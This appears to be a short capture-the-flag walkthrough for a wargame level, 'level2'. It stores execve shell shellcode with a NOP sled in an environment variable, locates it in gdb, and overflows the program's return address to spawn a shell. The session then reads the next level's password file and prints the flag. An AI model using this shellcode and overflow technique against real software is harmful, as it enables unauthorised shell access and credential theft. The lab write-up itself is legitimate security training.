For this one, we can use `eip` register, so we will set a environment variable with a shellcode, we create our environment variable :
```bash
export EXPLOIT=$(python -c "print '\x90' * 300 + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'")
```

Now, we need to find what is the env adress of `EXPLOIT` in `gdb` :
```nasm
x/1000x $esp - 1000
0xbffff8e0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff8f0:	0x90909090	0x90909090	0x31909090	0x31db31c0
```
 
We have the end adress of `EXPLOIT` which filled by `x90` representing `nop` instructions in asm.
We just need to add the padding, set `EIP` on `p()` return address and add the address of the EXPLOIT in the environnement variable:
```bash
(python -c "print '\x90' * 80 + '\x3e\x85\x04\x08' + '\x04\xf8\xff\xbf'" ; cat) | ./level2
????????????????????????????????????????????????????????????????>????????????>???
whoami
level3
cd .. && cat level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
